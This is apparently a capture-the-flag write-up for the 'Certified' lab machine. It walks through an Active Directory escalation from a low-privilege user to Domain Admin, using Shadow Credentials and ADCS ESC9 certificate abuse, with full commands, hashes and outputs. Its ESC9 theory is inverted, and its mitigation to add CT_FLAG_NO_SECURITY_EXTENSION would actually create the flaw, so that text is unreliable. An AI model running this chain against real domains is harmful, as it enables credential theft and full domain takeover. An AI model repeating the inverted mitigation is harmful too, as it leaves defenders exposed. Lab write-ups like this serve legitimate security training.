# Certified — Privilege Escalation

**Box:** Certified  
**Target:** 10.129.231.186 (Windows AD DC)  
**Domain:** certified.htb

This document covers the privilege escalation paths from a low-privilege domain user to NT AUTHORITY\SYSTEM.

---

## Paths to SYSTEM

### Path 1: management_svc → Domain Admin (Shadow Credentials + ESC9) ⭐ COMPLETED

| Phase | Prerequisite | Technique | Tool |
|-------|-------------|-----------|------|
| User → management_svc | `WriteOwner` on Management, `GenericWrite` on management_svc | Shadow Credentials | pywhisker + PKINITtools |
| management_svc → ca_operator | `GenericAll` on ca_operator | Shadow Credentials | pywhisker + PKINITtools |
| ca_operator → Administrator | ESC9 template enrollment rights | ADCS ESC9 + UPN spoofing | certipy-ad |

**Status:** ✅ **FULL CHAIN COMPLETED — ROOTED**

---

## Detailed Escalation: management_svc → ca_operator (Shadow Credentials)

### Theory

`GenericAll` on a target account grants full write access to all attributes, including `msDS-KeyCredentialLink`. Writing a new KeyCredential allows PKINIT authentication as that account.

### Execution

```bash
# Add shadow credential to ca_operator using management_svc's hash
pywhisker -d certified.htb -u management_svc \
  -H a091c1832bcdd4677c28b5a6a1295584 \
  --target ca_operator --action add

# Output:
#   PFX: ELnnqsrR.pfx
#   Password: 0tIfRJ6JeltPZu3Z8b3b

# Get TGT for ca_operator
python3 PKINITtools/gettgtpkinit.py \
  -pfx ELnnqsrR.pfx -certipy '0tIfRJ6JeltPZu3Z8b3b' \
  certified.htb/ca_operator ca_operator.ccache

# Recover NT hash
python3 PKINITtools/getnthash.py \
  -key 8eba90081e5225ab7e1a0fafdcf95651b71467e447f4a71f1a935945bb336ea0 \
  certified.htb/ca_operator
# NT: b4b86f45c6018f1b664f70805f45d8f2
```

---

## Detailed Escalation: ca_operator → Administrator (ADCS ESC9)

### Theory

AD CS ESC9 exploits certificate templates that lack the `CT_FLAG_NO_SECURITY_EXTENSION` flag. Such templates issue certificates valid for Kerberos authentication. If a template also has `SubjectAltRequireUpn` and allows enrollment by a compromised account, an attacker can obtain a certificate for any user (including Administrator).

**Key conditions for ESC9:**
1. Template without `NoSecurityExtension` flag (`CT_FLAG_NO_SECURITY_EXTENSION`)
2. Template has `SubjectAltRequireUpn` (enrollee supplies UPN)
3. Enrollment rights granted to a compromised account
4. No manager approval required

### Target Template: CertifiedAuthentication

```
Template Name:       CertifiedAuthentication
CA:                  certified-DC01-CA
Enrollment Rights:   CERTIFIED.HTB\operator ca
Client Auth:         True
SubjectAltRequireUpn: True
NoSecurityExtension: ABSENT (vulnerable!)
ESC9:                YES
```

### Execution

```bash
# Step 1: Identify ESC9 template
certipy-ad find -u ca_operator -hashes b4b86f45c6018f1b664f70805f45d8f2 \
  -dc-ip 10.129.231.186 -vulnerable

# Step 2: Change ca_operator UPN to "Administrator"
# The certificate's SAN UPN will match the enrollee's UPN attribute
certipy-ad account update \
  -username management_svc@certified.htb \
  -hashes a091c1832bcdd4677c28b5a6a1295584 \
  -user ca_operator -upn Administrator

# Step 3: Request certificate for Administrator
certipy-ad req \
  -username ca_operator@certified.htb \
  -hashes b4b86f45c6018f1b664f70805f45d8f2 \
  -dc-ip 10.129.231.186 \
  -ca certified-DC01-CA \
  -template CertifiedAuthentication \
  -upn administrator@certified.htb \
  -sid S-1-5-21-729746778-2675978091-3820388244-500
# Output: administrator.pfx (contains Administrator@certified.htb in SAN)

# Step 4: IMMEDIATELY restore ca_operator UPN
certipy-ad account update \
  -username management_svc@certified.htb \
  -hashes a091c1832bcdd4677c28b5a6a1295584 \
  -user ca_operator -upn ca_operator@certified.htb

# Step 5: Authenticate as Administrator using certificate
certipy-ad auth -pfx administrator.pfx \
  -domain certified.htb -dc-ip 10.129.231.186
# NT hash: 0d5b49608bbce1751f708748f67e2d34

# Step 6: Shell as Administrator
evil-winrm -i certified.htb -u Administrator -H 0d5b49608bbce1751f708748f67e2d34
```

---

## Other Attempted Paths

### TGS-REP Roasting (management_svc)

```bash
impacket-GetUserSPNs -dc-ip 10.129.231.186 certified.htb/judith.mader:judith09 -request-user management_svc
```

Extracted TGS-REP hash but cracking with rockyou.txt and other wordlists was **unsuccessful**.

### DCSync (judith.mader)

```bash
impacket-secretsdump certified.htb/judith.mader:judith09@10.129.231.186
```

Failed with `rpc_s_access_denied` and DRSR errors — judith.mader lacks DCSync rights.

### LDAP-based ACL abuse via bloodyAD

```bash
bloodyAD --host 10.129.231.186 -d certified.htb -u judith.mader -p judith09 \
  add genericAll management_svc judith.mader
```

Failed — bloodyAD uses LDAP and `genericAll` write to `nTSecurityDescriptor` was blocked. `net rpc` was the correct path.

---

## Key Credentials (Privilege Escalation)

| Identity | Type | Value | Purpose |
|---|---|---|---|
| ca_operator | NT hash | `b4b86f45c6018f1b664f70805f45d8f2` | Authenticate to AD CS as ca_operator |
| Administrator | NT hash | `0d5b49608bbce1751f708748f67e2d34` | **FINAL HASH — Domain Admin** |
| administrator.pfx | Certificate | `administrator.pfx` | ESC9 certificate for Administrator |
| ELnnqsrR.pfx | Certificate | `ELnnqsrR.pfx` | ca_operator shadow credential |
| 0tIfRJ6JeltPZu3Z8b3b | PFX password | — | ca_operator PFX password |

---

## Mitigation Notes

1. **Shadow Credentials:**
   - Remove `GenericWrite`/`GenericAll` permissions on `msDS-KeyCredentialLink` from untrusted principals
   - Enable `Protected Users` security group membership (blocks PKINIT for NTLM-only auth)
   - Monitor Active Directory for unexpected `msDS-KeyCredentialLink` modifications (Event ID 4662)

2. **ADCS ESC9:**
   - Add `CT_FLAG_NO_SECURITY_EXTENSION` flag to vulnerable templates
   - Remove enrollment rights from low-privilege service accounts
   - Enable `Manager Approval` requirement on sensitive templates
   - Monitor certificate requests for UPN values that don't match the enrollee account
